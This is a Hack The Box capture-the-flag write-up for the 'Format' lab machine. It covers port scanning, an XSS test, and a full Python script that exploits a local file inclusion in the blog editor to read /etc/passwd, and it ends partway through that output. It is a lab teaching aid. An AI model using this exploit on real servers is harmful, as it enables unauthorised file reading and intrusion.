
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Format - HTB</title>
    <link rel="stylesheet" href="/styles.css">
    <link rel="stylesheet" href="/writeups.css">
    <link rel="stylesheet" href="/monokai.css">
</head>
<body>
    <header>
        <nav>
            <ul>
                <li><a href="/index.html">Home</a></li>
                <li><a href="/writeups.html">WriteUPs</a></li>
                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
                <li><a href="/about.html">About me</a></li>
            </ul>
        </nav>
    </header>
    <section class="writeup-content">
        <div class="container">
            <div class="writeup-panel">
                <img src="/writeups/htb/medium/format/img/format.png" alt="Machine Icon" class="machine-icon-circle">
                <h2>Format - HTB</h2>
                <p>walkthrough by elswix<p>
                <ul class="machine-links">
                    <li><a href="https://app.hackthebox.com/machines/Format">HackTheBox</a></li>
                </ul>
            </div>
            <div class="writeup-content-main">
                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Format</span>
<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">05</span><span class="o">/</span><span class="mi">13</span><span class="o">/</span><span class="mi">2023</span>
</pre></div>
<h3><br/>About Format</h3><br/>
Format is a medium-difficulty machine in which we need to exploit a web service to read system files. We achieve this by inspecting the page's source code hosted on port <code>3000</code> in a repository of the <code>Gitea</code> service.<br/><br/>
<h3><br>Shell as www-data</br></h3><br>
Thanks to the LFI we exploited, we were able to access sensitive information about the <code>Nginx</code> configuration. This allowed us to make requests to a UNIX Socket, enabling us to interact with Redis and alter user database property values. We escalated our user privileges by modifying the <code>Pro</code> field, increasing our advantages on the site.<br/><br/>
As a <code>Pro</code> user, we have the capability to upload images, which are stored in a directory called <code>uploads</code>. With write privileges on this directory, we took advantage of the LFI vulnerability (which also allows writing files at the system level) to store a PHP web shell in the <code>uploads</code> directory. This allowed us to later execute system-level commands. <br/><br/>
<h3><br>Shell as cooper</br></h3><br>
Once we gain access to the system, we can connect to the Redis socket using the <code>redis-cli</code> tool. This allows us to list all stored keys. By reading the key associated with the user <code>cooper</code>, we obtain their credentials and proceed to escalate our privileges to that user.<br/><br/>
<h3><br>Shell as root</br></h3><br>
As the user <code>cooper</code>, we have sudo privileges to execute a Python program as the root user. This program is vulnerable to <code>Python Format String Vulnerability</code>, which allows us to access objects during the program's execution. Consequently, we can list the value of a variable that stores the root user's password.<br/><br/>
<h3><br>Recon</br></h3><br>
Before we start with the exploitation, let's begin with enumeration. Machines expose services, and these services are exposed through ports.<br/><br/>
With that in mind, we'll initiate a port scanning:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.213</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.213</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65532</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span>
<span class="mi">3000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ppp</span>
</pre></div>

Once we've completed the initial port scanning to identify the open ports on the victim machine (using the TCP protocol), we'll perform a comprehensive scan on these open ports. The goal is to recognize the technologies, services, and versions running on these ports that we've discovered.<br/><br/>
Once again, we'll use <code>nmap</code> to perform this scan:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">3000</span> <span class="mf">10.10.11.213</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.213</span> <span class="p">(</span><span class="mf">10.10.11.213</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>

<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.4</span><span class="n">p1</span> <span class="n">Debian</span> <span class="mi">5</span><span class="o">+</span><span class="n">deb11u1</span> <span class="p">(</span><span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">3072</span> <span class="n">c3</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span><span class="n">ce</span><span class="p">:</span><span class="mi">83</span><span class="p">:</span><span class="mi">7</span><span class="n">d</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">5</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">d</span><span class="p">:</span><span class="n">ed</span><span class="p">:</span><span class="n">b5</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="n">cd</span><span class="p">:</span><span class="n">f2</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">4</span><span class="n">f</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="n">b3</span><span class="p">:</span><span class="n">aa</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">2</span><span class="n">b</span><span class="p">:</span><span class="mi">99</span><span class="p">:</span><span class="mi">7</span><span class="n">d</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="n">fe</span><span class="p">:</span><span class="n">b6</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="mi">88</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="n">a5</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="n">c1</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">fa</span><span class="p">:</span><span class="n">b3</span><span class="p">:</span><span class="mi">7</span><span class="n">d</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="mi">1</span><span class="n">a</span><span class="p">:</span><span class="n">bc</span><span class="p">:</span><span class="n">d1</span><span class="p">:</span><span class="mi">4</span><span class="n">b</span><span class="p">:</span><span class="mi">68</span><span class="p">:</span><span class="n">ed</span><span class="p">:</span><span class="n">d6</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span><span class="mi">67</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="n">d7</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.18.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesn</span><span class="s1">'t have a title (text/html).</span>
<span class="mi">3000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.18.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">3000</span><span class="o">/</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
</pre></div>

At first glance, we can see that port 22 belongs to the SSH service, port 80 belongs to HTTP (a web service), and port 3000 is also associated with an HTTP service.<br/><br/>
One important note is that we are given a domain when accessing port 3000 via HTTP. Therefore, we should add it to the <code>/etc/hosts</code> file to enable proper resolution.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>

<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>

<span class="c1"># HackTheBox</span>
<span class="mf">10.10.11.213</span> <span class="n">microblog</span><span class="o">.</span><span class="n">htb</span>
</pre></div>

Before accessing the web services through the browser, I always like to run a technology scan using the <code>whatweb</code> tool.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.213</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.213</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.213</span><span class="p">],</span> <span class="n">Meta</span><span class="o">-</span><span class="n">Refresh</span><span class="o">-</span><span class="n">Redirect</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">app</span><span class="o">.</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
<span class="n">ERROR</span> <span class="n">Opening</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">app</span><span class="o">.</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span> <span class="n">no</span> <span class="n">address</span> <span class="k">for</span> <span class="n">app</span><span class="o">.</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span>
</pre></div>

When performing the scan on port 80, an error is reported because an attempt is made to access a subdomain that cannot be resolved. To resolve the subdomain, we should add it to the <code>/etc/hosts</code> file.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>

<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>

<span class="c1"># HackTheBox</span>
<span class="mf">10.10.11.213</span> <span class="n">microblog</span><span class="o">.</span><span class="n">htb</span> <span class="n">app</span><span class="o">.</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span>
</pre></div>

Inspecting the web service hosted on port 80, we observe the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/1.png"/><br/><br/>
If we scroll down on the homepage, there is a hyperlink that says "Contribute here!" which redirects us to the web service hosted on port 3000:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/2.png"/><br/><br/>
If we click on the hyperlink, we see the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/3.png"/><br/><br/>
Firstly, we can observe that <a href="https://about.gitea.com/">Gitea</a> is running under the web service on port <code>3000</code>. <a href="https://about.gitea.com/">Gitea</a> is an open-source platform for source code repository management, similar to GitHub.<br/><br/>
It appears that the hyperlink redirected us to a repository owned by the user <code>cooper</code> named <code>microblog</code>. It seems that this repository provides the source code for the homepage on port 80.<br/><br/>
Before inspecting the code in-depth, I will navigate to the homepage and create a user account:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/4.png"/><br/><br/>
Once logged in with a valid user, it appears that the page offers services to create our own logs under subdomains:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/5.png"/><br/><br/>
We can specify the subdomain we want to use:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/6.png"/><br/><br/>
Upon creation, we are presented with the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/7.png"/><br/><br/>
We can try to access the site that was created. However, since it is accessed through a new subdomain, we need to add it to the <code>/etc/hosts</code> file in order to resolve it:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>

<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>

<span class="c1"># HackTheBox</span>
<span class="mf">10.10.11.213</span> <span class="n">microblog</span><span class="o">.</span><span class="n">htb</span> <span class="n">app</span><span class="o">.</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span> <span class="n">elswix</span><span class="o">.</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span>
</pre></div>

Now, if we attempt to access it, we see the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/8.png"/><br/><br/>
We also have the option to edit it by clicking on <code>Edit It here.</code>:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/9.png"/><br/><br/>
If we click on <code>txt</code>, we can add content to our blog:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/11.png"/><br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/12.png"/><br/><br/>
Seeing our input reflected on the web page, we can attempt various injection attacks such as XSS, SSTI, among others. Let's try a simple XSS injection:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/13.png"/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/14.png"/><br/><br/>
The fields are vulnerable to XSS injections. This is just a test and not part of the machine exploitation.<br/><br/>
The requests to edit our blog are made in the <code>/edit/index.php</code> section.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/15.png"/><br/><br/>
Since we have access to the source code, we can try to understand how these user input fields are handled and potentially exploit them.<br/><br/>
In the repository we saw earlier, there is an example of a blog on the subdomain <code>sunny.microblog.htb</code> where we can view the source code of the blogs. Most likely, this blog works similarly to ours, allowing us to analyze what happens behind the scenes.<br/><br/>
Inspecting the <code>microblog/sunny/edit/index.php</code> file, we are presented with details about blog editing.<br/><br/>
It's evident that the website is using Redis as a database backend:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/16.png"/><br/><br/>
Inspecting the code further, we arrive at the section where we can edit the content of our blog, and we see the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/17.png"/><br/><br/>
As a user, we can modify both parameters used in the function: <code>id</code> and <code>txt</code>.<br/><br/>
What's happening here?<br/><br/>
Firstly, this code processes user input, creates a file with the name specified in <code>$_POST['id']</code>, writes the HTML content to that file, and also logs the filename in <code>order.txt</code>.<br/><br/>
In other words, the <code>id</code> parameter is the filename in which the information in HTML format will be written. The HTML-formatted information is a conversion of the information provided in the <code>txt</code> parameter. The file with the name specified by the <code>id</code> parameter is stored in the <code>content</code> directory with HTML content. Then, the filename (specified through the <code>id</code> parameter) is stored in the <code>order.txt</code> file. This is likely done to keep track of the files that are created.<br/><br/>
Next, we encounter the following function:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/18.png"/><br/><br/>
This function is responsible for loading the content of the <code>order.txt</code> file, which, as mentioned earlier, stores the filename specified by the <code>id</code> parameter.<br/><br/>
In other words, it loads the file whose name is stored in <code>order.txt</code>.<br/><br/>
We can take advantage of this because we can input data into <code>order.txt</code> as we control the <code>id</code> parameter. Therefore, we can try to input a system-level file name to attempt to load it.<br/><br/>
Let's try entering the file <code>/etc/passwd</code> in the <code>id</code> parameter, and then in the <code>txt</code> parameter, we'll input a random string; the content of the <code>txt</code> parameter doesn't matter much:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/19.png"/><br/><br/>
We send the request, and immediately in the response, we see the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/20.png"/><br/><br/>
In a not very elegant format, but we are reading files at the system level. We are abusing a Local File Inclusion (LFI).<br/><br/>
I hope I have explained myself clearly; I apologize if I was not very clear.<br/><br/>
<h3><br>Shell as www-data</br></h3><br>
First and foremost, we will create a script to automate the file reading process:<br/><br/>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3 </span>

<span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">string</span><span class="o">,</span> <span class="nn">warnings</span>

<span class="n">warnings</span><span class="o">.</span><span class="n">filterwarnings</span><span class="p">(</span><span class="s2">"ignore"</span><span class="p">,</span> <span class="n">category</span><span class="o">=</span><span class="ne">DeprecationWarning</span><span class="p">)</span>


<span class="c1"># Global</span>
<span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
<span class="n">blogName</span> <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">))</span>
<span class="n">lfiUrl</span> <span class="o">=</span> <span class="s2">"http://microblog.htb/edit/index.php"</span>
<span class="n">createBlogUrl</span> <span class="o">=</span> <span class="s2">"http://app.microblog.htb/dashboard/index.php"</span>
<span class="n">loginUrl</span> <span class="o">=</span> <span class="s2">"http://app.microblog.htb/login/index.php"</span>


<span class="k">def</span> <span class="nf">readFile</span><span class="p">(</span><span class="n">fileToRead</span><span class="p">):</span>

    <span class="n">login_data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">"username"</span><span class="p">:</span><span class="s2">"elswix"</span><span class="p">,</span>
        <span class="s2">"password"</span><span class="p">:</span><span class="s2">"elswix123$!"</span>
    <span class="p">}</span>

    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">loginUrl</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">login_data</span><span class="p">)</span>

    <span class="n">blog_data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">"new-blog-name"</span><span class="p">:</span><span class="s2">"</span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="n">blogName</span>
    <span class="p">}</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">createBlogUrl</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">blog_data</span><span class="p">)</span>

    <span class="n">lfi_data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">"id"</span><span class="p">:</span> <span class="s2">"</span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="n">fileToRead</span><span class="p">,</span>
        <span class="s2">"txt"</span><span class="p">:</span> <span class="s2">""</span> 

    <span class="p">}</span>

    <span class="n">lfi_headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">"Host"</span><span class="p">:</span> <span class="s2">"</span><span class="si">%s</span><span class="s2">.microblog.htb"</span> <span class="o">%</span> <span class="n">blogName</span>
    <span class="p">}</span>


    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">lfiUrl</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">lfi_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">lfi_headers</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">raw_output</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">'const html = "&lt;div class = </span><span class="se">\\</span><span class="s1">".+?</span><span class="se">\\</span><span class="s1">"&gt;(.*?)&lt;</span><span class="se">\\</span><span class="s1">/'</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">encoded_output</span> <span class="o">=</span> <span class="n">raw_output</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>
    <span class="n">formatted_output</span> <span class="o">=</span> <span class="n">encoded_output</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'unicode-escape'</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="n">formatted_output</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>


    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Not enough arguments: python3 </span><span class="si">%s</span><span class="s2"> &lt;file&gt;</span><span class="se">\n</span><span class="s2">"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>


    <span class="n">fileToRead</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">readFile</span><span class="p">(</span><span class="n">fileToRead</span><span class="p">)</span>




<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>

    <span class="n">main</span><span class="p">()</span>
</pre></div>

Once the script is finished, we test its functionality by attempting to read the <code>/etc/passwd</code> file:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="s2">"/etc/passwd"</span>

<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span>\<span class="o">/</span><span class="n">root</span><span class="p">:</span>\<span class="o">/</span><span class="nb">bin</span>\<span class="o">/</span><span class="n">bash</span>
<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="nb">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="nb">bin</span><span class="p">:</span>\<span class="o">/</span><span class="nb">bin</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span>\<span class="o">/</span><span class="n">dev</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span>\<span class="o">/</span><span class="nb">bin</span><span class="p">:</span>\<span class="o">/</span><span class="nb">bin</span>\<span class="o">/</span><span class="n">sync</span>
<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">games</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span>\<span class="o">/</span><span class="n">var</span>\<span class="o">/</span><span class="n">cache</span>\<span class="o">/</span><span class="n">man</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span>\<span class="o">/</span><span class="n">var</span>\<span class="o">/</span><span class="n">spool</span>\<span class="o">/</span><span class="n">lpd</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
